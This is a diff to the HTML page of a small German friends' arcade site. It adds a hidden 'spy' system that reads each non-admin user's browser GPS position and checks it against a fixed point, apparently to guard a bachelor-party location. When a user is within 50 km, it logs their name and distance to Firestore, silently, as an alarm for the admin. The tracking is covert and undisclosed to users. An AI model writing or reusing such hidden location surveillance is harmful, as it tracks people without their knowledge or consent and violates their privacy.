@@ -121,6 +121,15 @@
 <body>
 
     <h1>MBA ARCADE</h1>
+    <div id="admin-alarm-box" style="display:none; background:red; color:white; padding:15px; border-radius:5px; margin-bottom:20px; text-align:center; border: 2px solid white; animation: blink 1s infinite;">
+        🚨 <strong>ALARM! JGA RADIUS VERLETZT!</strong><br>
+        <span id="intruder-details" style="font-size: 0.9rem;">...</span>
+        <button onclick="dismissAlarm()" style="margin-top:10px; background:#333; color:white; border:1px solid white; padding:5px 10px; cursor:pointer;">Gesehen</button>
+    </div>
+
+    <style>
+        @keyframes blink { 50% { opacity: 0.5; } }
+    </style>
     <img id="current-user-avatar" src="100.jpg" alt="Avatar">
     <p id="user-greeting">Lade...</p>
 
@@ -166,6 +175,8 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getAuth, signOut, onAuthStateChanged, updatePassword } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+        // NEU: Diese Zeile hat gefehlt! Sie lädt die Datenbank-Befehle:
+        import { getFirestore, collection, addDoc, doc, onSnapshot, query, where, getDocs, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
         // --- DEINE FIREBASE CONFIG EINFÜGEN ---
         const firebaseConfig = {
@@ -179,6 +190,7 @@
 
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
+        const db = getFirestore(app); // NEU: Datenbank initialisieren
 
         // --- AVATAR LOGIK ---
         const myAvatars = ["100.jpg", "102.jpg", "200.jpg", "205.jpg", "400.jpg"];
@@ -237,9 +249,22 @@
         // --- AUTH ---
         onAuthStateChanged(auth, (user) => {
             if (user) {
-                const name = user.email.replace("@mba-arcade.com", "");
+                // Name aus Email extrahieren
+                const name = user.email.replace("@mba-arcade.com", ""); 
                 document.getElementById("user-greeting").innerText = "Hallo " + name + "!";
+                
                 initProfile();
+
+                // --- HIER IST DIE WEICHE ---
+                if (user.email === ADMIN_EMAIL) {
+                    // 1. Du bist es -> Starte Überwachung
+                    initAdminWatch(user.email);
+                } else {
+                    // 2. Ein Freund ist es -> Starte Spion (GPS Check)
+                    initSpySystem(name); 
+                }
+                // ---------------------------
+
             } else {
                 window.location.href = "index.html";
             }
@@ -248,6 +273,100 @@
         window.logout = function() {
             signOut(auth).then(() => window.location.href = "index.html");
         }
+        
+        // --- Vorfreudesystem ---
+
+        // KONFIGURATION
+        const ADMIN_EMAIL = "benedikt@mba-arcade.com"; 
+        const TARGET_LAT = 49.783246; 
+        const TARGET_LON = 9.933074; 
+        const ALARM_RADIUS_KM = 50;
+
+        // TEIL 1: DER SPION (Läuft bei ALLEN Usern, außer bei Dir)
+        function initSpySystem(userEmail) {
+            // Wenn ICH es bin, überwache ich mich nicht selbst
+            if (userEmail === ADMIN_EMAIL) return; 
+
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const dist = calculateDistance(TARGET_LAT, TARGET_LON, lat, lon);
+                    console.log("JGA Check:", dist.toFixed(1), "km");
+
+                    if (dist <= ALARM_RADIUS_KM) {
+                        triggerSilentAlarm(userEmail, dist);
+                    }
+                }, (err) => console.log("Kein GPS."));
+            }
+        }
+
+        // TEIL 2: DIE ZENTRALE (Läuft NUR bei Dir)
+        function initAdminWatch(userEmail) {
+            // Sicherheits-Check: Nur starten, wenn die Email stimmt
+            if (userEmail !== ADMIN_EMAIL) return; 
+
+            console.log("Admin-Modus aktiviert. Überwache Radius...");
+
+            // Wir lauschen auf neue Alarme in der Datenbank
+            const q = query(collection(db, "security_logs"), where("viewed", "==", false));
+            
+            onSnapshot(q, (snapshot) => {
+                if (!snapshot.empty) {
+                    // ALARM!
+                    const latest = snapshot.docs[0].data();
+                    const alarmBox = document.getElementById('admin-alarm-box');
+                    const details = document.getElementById('intruder-details');
+                    
+                    // Box sichtbar machen
+                    alarmBox.style.display = 'block';
+                    details.innerText = `Zielperson: ${latest.intruder} (Entfernung: ${latest.distance}km)`;
+                    
+                    // Handy vibrieren lassen (funktioniert auf Android)
+                    if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
+                }
+            });
+        }
+
+        // Hilfsfunktion: Alarm als "Gesehen" markieren
+        window.dismissAlarm = async function() {
+            document.getElementById('admin-alarm-box').style.display = 'none';
+            // Alle offenen Alarme in der DB auf "viewed: true" setzen
+            const q = query(collection(db, "security_logs"), where("viewed", "==", false));
+            const snapshot = await getDocs(q);
+            snapshot.forEach(async (docSnap) => {
+                await updateDoc(doc(db, "security_logs", docSnap.id), { viewed: true });
+            });
+        }
+
+        // Hilfsfunktion: Alarm senden (schreibt in DB)
+        async function triggerSilentAlarm(name, distance) {
+            // Spam-Schutz: Nur alle 60 Min pro Browser
+            const last = localStorage.getItem('last_jga_alarm');
+            const now = new Date().getTime();
+            if (last && (now - last) < 3600000) return;
+
+            try {
+                await addDoc(collection(db, "security_logs"), { 
+                    intruder: name, distance: Math.round(distance), timestamp: new Date(), viewed: false 
+                });
+                localStorage.setItem('last_jga_alarm', now);
+            } catch(e) { console.error(e); }
+        }
+
+        // Mathe für Entfernung
+        function calculateDistance(lat1, lon1, lat2, lon2) {
+            const R = 6371; 
+            const dLat = (lat2 - lat1) * (Math.PI/180);
+            const dLon = (lon2 - lon1) * (Math.PI/180);
+            const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
+                      Math.cos(lat1 * (Math.PI/180)) * Math.cos(lat2 * (Math.PI/180)) * Math.sin(dLon/2) * Math.sin(dLon/2); 
+            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a)); 
+        }
     </script>
+        
+                    
+   
+
 </body>
 </html>
